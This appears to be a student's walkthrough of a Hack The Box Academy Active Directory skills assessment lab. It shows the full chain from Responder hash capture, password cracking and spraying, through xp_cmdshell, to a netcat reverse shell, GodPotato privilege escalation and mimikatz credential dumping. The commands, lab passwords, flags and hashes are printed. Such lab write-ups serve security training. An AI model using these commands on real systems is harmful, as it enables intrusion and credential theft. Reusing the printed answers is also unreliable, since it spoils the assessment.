# AD Enumeration & Attacks - Skills Assessment Part II

### Scenario

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.

### Questions

SSH to target with username "htb-student" and password "HTB\_@cademy\_stdnt!"

start the enumeration process using various tools

```
sudo responder -I ens224 -A 
```

* Responder gave us nothing except one host 172.16.7.3

```
fping -asgq 172.16.7.0/24
```

* 172.16.7.3
* 172.16.7.50
* 172.16.7.60
* 172.16.7.240

Above are the addresses gained using fping

```
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

```
# Nmap 7.92 scan initiated Thu Jul  6 05:02:16 2023 as: nmap -v -A -iL hosts.txt -oN host-enum
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.0014s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-06 09:02:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 00:50:56:B9:2A:CE (VMware)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:2a:ce (VMware)
| Names:
|   DC01<00>             Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|   INLANEFREIGHT<1c>    Flags: <group><active>
|   DC01<20>             Flags: <unique><active>
|_  INLANEFREIGHT<1b>    Flags: <unique><active>
| smb2-time: 
|   date: 2023-07-06T09:03:05
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   1.43 ms inlanefreight.local (172.16.7.3)

Nmap scan report for 172.16.7.50
Host is up (0.0014s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Issuer: commonName=MS01.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-05T08:49:04
| Not valid after:  2024-01-04T08:49:04
| MD5:   953d c1a2 0b78 4cae 5971 7c88 d128 028a
|_SHA-1: 36cd 4829 d123 b96f 1514 9da2 84a3 995e a6af 888f
|_ssl-date: 2023-07-06T09:03:13+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-06T09:03:05+00:00
MAC Address: 00:50:56:B9:57:EA (VMware)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-06T09:03:06
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:57:ea (VMware)
| Names:
|   MS01<00>             Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|_  MS01<20>             Flags: <unique><active>

TRACEROUTE
HOP RTT     ADDRESS
1   1.39 ms 172.16.7.50

Nmap scan report for 172.16.7.60
Host is up (0.0027s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-06T08:49:10
| Not valid after:  2053-07-06T08:49:10
| MD5:   4072 38e1 e082 6a3d 0ce3 3b1d 36f4 8d6f
|_SHA-1: 3c68 e4fd 994c a089 6645 42cd 3219 b370 91ca d3fc
|_ssl-date: 2023-07-06T09:03:12+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
MAC Address: 00:50:56:B9:94:E0 (VMware

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   Windows server name: SQL01
|   172.16.7.60\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:94:e0 (VMware)
| Names:
|   SQL01<00>            Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|_  SQL01<20>            Flags: <unique><active>
| smb2-time: 
|   date: 2023-07-06T09:03:05
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   2.70 ms 172.16.7.60

Nmap scan report for 172.16.7.240
Host is up (0.0017s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)
|   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)
|_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)
3389/tcp open  ms-wbt-server xrdp

Uptime guess: 18.603 days (since Sat Jun 17 14:35:03 2023)
Network Distance: 0 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.7.3 (inlanefreight.local)
|     172.16.7.50
|_    172.16.7.60
```

According to nmap scan we know that

* 172.16.7.3 -> DC01.INLANEFREIGHT.LOCAL
* 172.16.7.50 -> MS01.INLANEFREIGHT.LOCAL
* 172.16.7.60 -> SQL01.INLANEFREIGHT.LOCAL
* 172.16.7.240 -> Our parrot machine

List of valid users



**Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?**

* Tried ASREP-ROASTING -> didn't work
  * impacket-GetNPUsers -format hashcat -usersfile valid\_users.txt -dc-ip 172.16.7.3 inlanefreight.local/
* Tried responder got user INLANEFREIGHT\AB920
  *   ```
      sudo responder -I ens224 -wrfv
      ```

      <figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption><p>AB920</p></figcaption></figure>

**What is this user's cleartext password?**

* Ran hashcat
  * ```
    hashcat -m 5600 ab920.txt /usr/share/wordlists/rockyou.txt
    ```

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>ab920:weasal</p></figcaption></figure>

**Submit the contents of the C:\flag.txt file on MS01.**

* 172.16.7.50 -> MS01.INLANEFREIGHT.LOCAL
  * SMB -> no read write access
  * RDP
    * add port `9050` to proxychains config file
    * `ssh -D 9050 htb_student@<IP>`
    * `proxychains xfreerdp /v:172.16.7.50 /u:ab920 /p:weasal /drive:linux,/home/kali/Desktop/htb_academy/active_directory`
    * ![](<../../../.gitbook/assets/image (15).png>)aud1t\_gr0up\_m3mbersh1ps!

**Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain**.

Checked domain password policy and got

```
Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=0; MaximumPasswordAge=42; MinimumPasswordLength=1; PasswordComplexity=0;
                 PasswordHistorySize=0; LockoutBadCount=0; RequireLogonToChangePassword=0;
                 ForceLogoffWhenHourExpire=0; ClearTextPassword=0; LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```

The above system accexx field shows that we can password spray without worrying of account getting locked.

```
Get-DomainUser | select samaccountname > valid_user.txt
```

Cleanup the txt file and performed password spray.

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_user.txt Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 07/06/23 - Ronnie Flathers @ropnop

2023/07/06 23:09:26 >  Using KDC(s):
2023/07/06 23:09:26 >   172.16.7.3:88

2023/07/06 23:09:42 >  [+] VALID LOGIN:  BR086@inlanefreight.local:Welcome1
2023/07/06 23:09:42 >  Done! Tested 2901 logins (1 successes) in 16.063 seconds
```

**What is this user's password?**

```
BR086@inlanefreight.local:Welcome1
```

**Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?**

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption><p>We can see that in smb share there is a config file that this user has access to has a password</p></figcaption></figure>

netdb:D@ta\_bAse\_adm1n!

**Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.**

```
.\mssqlclient.exe INLANEFREIGHT.LOCAL/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>netdb:D@ta_bAse_adm1n!</p></figcaption></figure>

Seems like the xp\_cmdshell is working without enabling it

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>service\mssql$sqlexpress</p></figcaption></figure>

Since we can execute commands through xp\_cmdshell, we can try to move file overthere and try getting reverse shell.

Start python server at linux attack machine where the nc.exe is present

<pre><code><strong>xp_cmdshell "powershell.exe wget http://172.16.7.240:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"
</strong>xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe 172.16.7.240 4444"
</code></pre>

Don't forget to run nc -lvnp 4444 at the attack host.

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>got the shell</p></figcaption></figure>

Since the seImpersonate was enabled there are few vulnerabilities that we could try. We can check if the system is vulnerable to juicy potato attack

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

Host Name:                 SQL01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
Hotfix(s):                 5 Hotfix(s) Installed.
```

juicy potato requries CLSRid which for me seems to be hard to get and can't exploite, then I tried GODPOTATO and it works like a charm!!.

{% embed url="https://github.com/BeichenDream/GodPotato" %}

```
./GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 172.16.7.240 2012"

nc -lvnp 2012
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>nt authority\system</p></figcaption></figure>

s3imp3rs0nate\_cl@ssic

**Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.**

```
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

572     {0;000003e7} 1 D 35085          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 1 D 2532987     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,10p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2577669     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : SQL01
SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6
Local SID : S-1-5-21-3827174835-953655006-33323432

SAMKey : 1f3713f605ea38af43344dc944dea5ce

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 880170df783dda58497007c8de7a836f

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-GVQQMKJCNDAAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a6b660de661c6a558a414560082262069223fb9815fab1f08169e0bb3954bc10
      aes128_hmac       (4096) : da03dd69f9d316baf21d16bb0639a559
      des_cbc_md5       (4096) : ef9898bf10c754b5
    OldCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e
    OlderCredentials
      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
      des_cbc_md5       (4096) : d32592d63b75ec1f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-GVQQMKJCNDAAdministrator
    Credentials
      des_cbc_md5       : ef9898bf10c754b5
    OldCredentials
      des_cbc_md5       : 9876615285c2766e


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
      des_cbc_md5       (4096) : 61299e7a768fa2d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5
```

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption><p>exc3ss1ve_adm1n_r1ights!</p></figcaption></figure>

**Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What this user's account name?**

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption><p>CT059</p></figcaption></figure>

**Crack this user's password hash and submit the cleartext password as your answer.**

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>ct059</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption><p>CT059:charlie1</p></figcaption></figure>

**Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.**

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.**

![](<../../../.gitbook/assets/image (14).png>)

